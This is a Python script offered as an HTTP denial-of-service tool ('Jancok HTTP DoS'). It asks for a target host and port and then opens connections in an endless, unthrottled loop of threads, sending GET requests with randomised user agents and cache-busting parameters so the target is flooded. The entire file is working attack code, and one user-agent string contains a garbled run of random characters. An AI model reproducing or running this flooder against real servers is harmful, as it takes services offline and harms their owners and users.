#!/usr/bin/python
# R&D ICWR - HTTP DoS
# By Afrizal F.A

print("""
   $$$$$\                                         $$\       
   \__$$ |                                        $$ |      
      $$ | $$$$$$\  $$$$$$$\   $$$$$$$\  $$$$$$\  $$ |  $$\ 
      $$ | \____$$\ $$  __$$\ $$  _____|$$  __$$\ $$ | $$  |
$$\   $$ | $$$$$$$ |$$ |  $$ |$$ /      $$ /  $$ |$$$$$$  / 
$$ |  $$ |$$  __$$ |$$ |  $$ |$$ |      $$ |  $$ |$$  _$$<  
\$$$$$$  |\$$$$$$$ |$$ |  $$ |\$$$$$$$\ \$$$$$$  |$$ | \$$\ 
 \______/  \_______|\__|  \__| \_______| \______/ \__|  \__|
------------------------------------------------------------
[*] Jancok HTTP DoS By R&D ICWR
------------------------------------------------------------
""")

from threading import Thread
import random
import socket
import ssl


class dos:

    def user_agent(self):

        self.arr = ["Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.0.12) Gecko/2009070611 Firefox/3.0.12 (.NET CLR 3.5.30729)", "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV (KHTML, like Gecko) Version/5.0 Safari/533.16", "Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0", "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.427.0 Safari/534.1"]
        return self.arr[random.randint(0, len(self.arr)-1)]

    def header(self, host, point):

        self.h_str = "GET /"+str(point)+"\r\n"
        self.h_str += "Host: "+str(host)+"\r\n"
        self.h_str += "Pragma: no-cache\r\n"
        self.h_str += "Cache-Control: no-cache\r\n"
        self.h_str += "Accept-Encoding: */*\r\n"
        self.h_str += "User-Agent: "+self.user_agent()+"\r\n"
        self.h_str += "Accept-language: */*\r\n"
        self.h_str += "X-a: "+str(random.randint(0000000, 9999999))+"\r\n"
        self.h_str += "Connection: Keep-Alive\r\n"
        self.h_str += "Accept: */*\r\n\r\n"
        return self.h_str

    def socks(self, host, port, ssl_value, header):

        try:

            if ssl_value == True:

                get_ssl = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
                s = get_ssl.wrap_socket(socket.socket(socket.AF_INET,socket.SOCK_STREAM),server_hostname=host)

            elif ssl_value == False:

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.connect((host, int(port)))
            s.send(header.encode())
            s.close()
            print("[+] Attacking Host -> "+host+" | Port -> "+str(port))

        except:

            print("[-] Network Error.....")

    def __init__(self):


        host = input("[*] HOST -> ")
        port = input("[*] PORT -> ")
        ssl_value = input("[*] SSL ( Y / N ) -> ")

        if ssl_value.lower() == "y":

            ssl_value = True

        elif ssl_value.lower() == "n":

            ssl_value = False

        point = input("[*] Point ( Quick Enter For Random ) -> ")
        print("\n")

        if point != '' and host != '' and port != '':

            while True:

                Thread(target=self.socks, args=(host, port, ssl_value, self.header(host, point))).start()

        elif host != '' and port != '':

            while True:

                param = "?"+str(random.randint(0000000, 9999999))+" HTTP/1.1"
                Thread(target=self.socks, args=(host, port, ssl_value, self.header(host, param))).start()

        else:

            print("[-] Invalid Option")


if __name__ == "__main__":

    dos()
